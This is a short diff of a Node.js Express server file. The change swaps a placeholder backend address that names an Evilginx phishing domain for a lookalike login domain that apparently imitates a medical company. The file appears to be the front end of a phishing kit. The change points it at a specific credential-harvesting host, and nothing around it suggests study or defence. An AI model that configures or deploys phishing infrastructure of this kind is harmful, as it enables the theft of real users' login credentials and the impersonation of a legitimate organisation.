@@ -2,7 +2,7 @@ const express = require("express");
 const fetch = require("node-fetch");
 const app = express();
 
-const BACKEND_URL = "https://www.your-evilginx-domain.com/manage-it/index.jsp";
+const BACKEND_URL = " https://login.acceleratedmedicallinc.org";
 
 app.get("/", (req, res) => {
   res.sendFile(__dirname + "/index.html");
